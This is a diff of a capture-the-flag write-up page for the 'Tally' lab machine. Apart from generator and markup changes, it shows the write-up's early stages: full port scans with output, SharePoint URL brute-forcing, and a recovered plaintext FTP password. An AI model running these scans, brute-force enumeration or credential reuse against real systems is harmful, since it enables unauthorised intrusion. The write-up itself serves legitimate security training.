@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -314,366 +314,366 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):</a>
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo ./htbscan.py 10.10.10.59 <span class="m">300</span>
-<span class="err">
-</span><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 300 --interactive 10.10.10.59
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-03 12:04:44 GMT
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 49668/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 80/tcp on 10.10.10.59                                     
-</span><span class="go">Discovered open port 445/tcp on 10.10.10.59                                    
-</span><span class="go">Discovered open port 32843/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 49665/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 1433/tcp on 10.10.10.59                                   
-</span><span class="go">Discovered open port 135/tcp on 10.10.10.59                                    
-</span><span class="go">Discovered open port 32844/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 81/tcp on 10.10.10.59                                     
-</span><span class="go">Discovered open port 49667/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 32846/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 47001/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 15567/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 49664/tcp on 10.10.10.59                                  
-</span><span class="go">Discovered open port 139/tcp on 10.10.10.59                                    
-</span><span class="go">Discovered open port 49670/tcp on 10.10.10.59                                  
-</span><span class="go">                                                                             
-</span><span class="go">Running command: sudo nmap -A -p80,81,135,139,445,1433,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49670 10.10.10.59
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 15:11 EEST
-</span><span class="go">Nmap scan report for 10.10.10.59
-</span><span class="go">Host is up (0.12s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT      STATE SERVICE              VERSION
-</span><span class="go">80/tcp    open  http                 Microsoft IIS httpd 10.0
-</span><span class="go">|_http-server-header: Microsoft-IIS/10.0
-</span><span class="go">81/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
-</span><span class="go">|_http-title: Bad Request
-</span><span class="go">135/tcp   open  msrpc                Microsoft Windows RPC
-</span><span class="go">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
-</span><span class="go">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-</span><span class="go">1433/tcp  open  ms-sql-s             Microsoft SQL Server 2016 13.00.1601.00; RTM
-</span><span class="go">| ms-sql-ntlm-info: 
-</span><span class="go">|   Target_Name: TALLY
-</span><span class="go">|   NetBIOS_Domain_Name: TALLY
-</span><span class="go">|   NetBIOS_Computer_Name: TALLY
-</span><span class="go">|   DNS_Domain_Name: TALLY
-</span><span class="go">|   DNS_Computer_Name: TALLY
-</span><span class="go">|_  Product_Version: 10.0.14393
-</span><span class="go">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-</span><span class="go">| Not valid before: 2018-05-03T10:47:41
-</span><span class="go">|_Not valid after:  2048-05-03T10:47:41
-</span><span class="go">|_ssl-date: 2018-05-03T12:12:35+00:00; +3s from scanner time.
-</span><span class="go">15567/tcp open  http                 Microsoft IIS httpd 10.0
-</span><span class="go">| http-auth: 
-</span><span class="go">| HTTP/1.1 401 Unauthorized\x0D
-</span><span class="go">|   Negotiate
-</span><span class="go">|_  NTLM
-</span><span class="go">| http-ntlm-info: 
-</span><span class="go">|   Target_Name: TALLY
-</span><span class="go">|   NetBIOS_Domain_Name: TALLY
-</span><span class="go">|   NetBIOS_Computer_Name: TALLY
-</span><span class="go">|   DNS_Domain_Name: TALLY
-</span><span class="go">|   DNS_Computer_Name: TALLY
-</span><span class="go">|_  Product_Version: 10.0.14393
-</span><span class="go">|_http-server-header: Microsoft-IIS/10.0
-</span><span class="go">|_http-title: Site doesn&#39;t have a title.
-</span><span class="go">32843/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
-</span><span class="go">|_http-title: Service Unavailable
-</span><span class="go">32844/tcp open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
-</span><span class="go">|_http-title: Service Unavailable
-</span><span class="go">| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
-</span><span class="go">| Subject Alternative Name: DNS:localhost, DNS:tally
-</span><span class="go">| Not valid before: 2017-09-17T22:51:16
-</span><span class="go">|_Not valid after:  9999-01-01T00:00:00
-</span><span class="go">|_ssl-date: 2018-05-03T12:12:37+00:00; +3s from scanner time.
-</span><span class="go">| tls-alpn: 
-</span><span class="go">|   h2
-</span><span class="go">|_  http/1.1
-</span><span class="go">32846/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
-</span><span class="go">47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
-</span><span class="go">|_http-title: Not Found
-</span><span class="go">49664/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">49665/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">49666/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">49667/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">49668/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">49670/tcp open  msrpc                Microsoft Windows RPC
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
-</span><span class="go">No exact OS matches for host (test conditions non-ideal).
-</span><span class="go">Network Distance: 2 hops
-</span><span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Host script results:
-</span><span class="go">|_clock-skew: mean: 2s, deviation: 0s, median: 2s
-</span><span class="go">| ms-sql-info: 
-</span><span class="go">|   10.10.10.59:1433: 
-</span><span class="go">|     Version: 
-</span><span class="go">|       name: Microsoft SQL Server 2016 RTM
-</span><span class="go">|       number: 13.00.1601.00
-</span><span class="go">|       Product: Microsoft SQL Server 2016
-</span><span class="go">|       Service pack level: RTM
-</span><span class="go">|       Post-SP patches applied: false
-</span><span class="go">|_    TCP port: 1433
-</span><span class="go">| smb-security-mode: 
-</span><span class="go">|   account_used: guest
-</span><span class="go">|   authentication_level: user
-</span><span class="go">|   challenge_response: supported
-</span><span class="go">|_  message_signing: disabled (dangerous, but default)
-</span><span class="go">| smb2-security-mode: 
-</span><span class="go">|   2.02: 
-</span><span class="go">|_    Message signing enabled but not required
-</span><span class="go">| smb2-time: 
-</span><span class="go">|   date: 2018-05-03 15:12:36
-</span><span class="go">|_  start_date: 2018-05-03 13:47:08
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ./htbscan.py 10.10.10.59 <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 300 --interactive 10.10.10.59
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-03 12:04:44 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49668/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.59                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 445/tcp on 10.10.10.59                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32843/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49665/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 1433/tcp on 10.10.10.59                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 135/tcp on 10.10.10.59                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32844/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 81/tcp on 10.10.10.59                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49667/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32846/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 47001/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 15567/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49664/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 139/tcp on 10.10.10.59                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49670/tcp on 10.10.10.59                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                             
+</span></span></span><span class="line"><span class="cl"><span class="go">Running command: sudo nmap -A -p80,81,135,139,445,1433,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49670 10.10.10.59
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 15:11 EEST
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.59
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.12s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE              VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp    open  http                 Microsoft IIS httpd 10.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-IIS/10.0
+</span></span></span><span class="line"><span class="cl"><span class="go">81/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Bad Request
+</span></span></span><span class="line"><span class="cl"><span class="go">135/tcp   open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+</span></span></span><span class="line"><span class="cl"><span class="go">1433/tcp  open  ms-sql-s             Microsoft SQL Server 2016 13.00.1601.00; RTM
+</span></span></span><span class="line"><span class="cl"><span class="go">| ms-sql-ntlm-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Target_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Domain_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Computer_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Domain_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Computer_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Product_Version: 10.0.14393
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2018-05-03T10:47:41
+</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2048-05-03T10:47:41
+</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: 2018-05-03T12:12:35+00:00; +3s from scanner time.
+</span></span></span><span class="line"><span class="cl"><span class="go">15567/tcp open  http                 Microsoft IIS httpd 10.0
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-auth: 
+</span></span></span><span class="line"><span class="cl"><span class="go">| HTTP/1.1 401 Unauthorized\x0D
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Negotiate
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  NTLM
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-ntlm-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Target_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Domain_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Computer_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Domain_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Computer_Name: TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Product_Version: 10.0.14393
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-IIS/10.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Site doesn&#39;t have a title.
+</span></span></span><span class="line"><span class="cl"><span class="go">32843/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Service Unavailable
+</span></span></span><span class="line"><span class="cl"><span class="go">32844/tcp open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Service Unavailable
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
+</span></span></span><span class="line"><span class="cl"><span class="go">| Subject Alternative Name: DNS:localhost, DNS:tally
+</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2017-09-17T22:51:16
+</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  9999-01-01T00:00:00
+</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: 2018-05-03T12:12:37+00:00; +3s from scanner time.
+</span></span></span><span class="line"><span class="cl"><span class="go">| tls-alpn: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   h2
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  http/1.1
+</span></span></span><span class="line"><span class="cl"><span class="go">32846/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
+</span></span></span><span class="line"><span class="cl"><span class="go">47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Not Found
+</span></span></span><span class="line"><span class="cl"><span class="go">49664/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">49665/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">49666/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">49667/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">49668/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">49670/tcp open  msrpc                Microsoft Windows RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
+</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
+</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="go">|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+</span></span></span><span class="line"><span class="cl"><span class="go">| ms-sql-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   10.10.10.59:1433: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Version: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|       name: Microsoft SQL Server 2016 RTM
+</span></span></span><span class="line"><span class="cl"><span class="go">|       number: 13.00.1601.00
+</span></span></span><span class="line"><span class="cl"><span class="go">|       Product: Microsoft SQL Server 2016
+</span></span></span><span class="line"><span class="cl"><span class="go">|       Service pack level: RTM
+</span></span></span><span class="line"><span class="cl"><span class="go">|       Post-SP patches applied: false
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    TCP port: 1433
+</span></span></span><span class="line"><span class="cl"><span class="go">| smb-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   account_used: guest
+</span></span></span><span class="line"><span class="cl"><span class="go">|   authentication_level: user
+</span></span></span><span class="line"><span class="cl"><span class="go">|   challenge_response: supported
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  message_signing: disabled (dangerous, but default)
+</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   2.02: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    Message signing enabled but not required
+</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-time: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   date: 2018-05-03 15:12:36
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  start_date: 2018-05-03 13:47:08
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</h2>
 
 <p>We see that Microsoft SharePoint is on the box. Let&rsquo;s download the SharePointURLBrute tool from here:
 <a href="https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/" target="_blank">https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/</a></p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>perl SharePointURLBrute<span class="se">\ </span>v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
-<span class="err">
-</span><span class="err"></span><span class="go">Starting search for common SharePoint Pages
-</span><span class="go">Start Time: Sun Nov  5 11:37:15 2017
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">FOUND: http://10.10.10.59/_catalogs/masterpage/Forms/AllItems.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_catalogs/wp/Forms/AllItems.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/AreaNavigationSettings.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaTemplateSettings.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaWelcomePage.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_Layouts/ChangeSiteMasterPage.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/MyInfo.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/MyPage.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/PageSettings.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/policy.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/policyconfig.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/policycts.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/Policylist.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_Layouts/RedirectPage.aspx?Target={SiteCollectionUrl}_catalogs/masterpage
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/SiteDirectorySettings.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_layouts/sitemanager.aspx
-</span><span class="go">FOUND: http://10.10.10.59/_Layouts/SiteManager.aspx?lro=all
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/alerts.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/dspsts.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/forms.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/Lists.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/people.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/Permissions.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/search.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/UserGroup.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/versions.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/Views.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/webpartpages.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/webs.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/SharepointEmailWS.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/spsearch.asmx
-</span><span class="go">FOUND: http://10.10.10.59/_vti_bin/WebPartPages.asmx
-</span><span class="go">FOUND: http://10.10.10.59/default.aspx
-</span><span class="go">FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> perl SharePointURLBrute<span class="se">\ </span>v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting search for common SharePoint Pages
+</span></span></span><span class="line"><span class="cl"><span class="go">Start Time: Sun Nov  5 11:37:15 2017
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">FOUND: http://10.10.10.59/_catalogs/masterpage/Forms/AllItems.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_catalogs/wp/Forms/AllItems.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/AreaNavigationSettings.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaTemplateSettings.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaWelcomePage.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/ChangeSiteMasterPage.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/MyInfo.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/MyPage.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/PageSettings.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policy.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policyconfig.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policycts.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/Policylist.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/RedirectPage.aspx?Target={SiteCollectionUrl}_catalogs/masterpage
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/SiteDirectorySettings.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/sitemanager.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/SiteManager.aspx?lro=all
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/alerts.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/dspsts.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/forms.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Lists.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/people.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Permissions.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/search.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/UserGroup.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/versions.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Views.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/webpartpages.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/webs.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/SharepointEmailWS.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/spsearch.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/WebPartPages.asmx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/default.aspx
+</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx
+</span></span></span></code></pre></div></div>
 
 <h2 id="getting-ftp-credentials">Getting FTP credentials</h2>
 
 <p>If we open the <a href="http://10.10.10.59/shared%20documents/forms/allitems.aspx" target="_blank">http://10.10.10.59/shared%20documents/forms/allitems.aspx</a>, we see a file named &ldquo;ftp-details&rdquo; modified by tally\administrator. Let&rsquo;s download it and see what there is inside:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">FTP details
-hostname: tally
-workgroup: htb.local
-password: UTDRSCH53c&#34;$6hys
-Please create your own user folder upon logging in</code></pre></div></p>
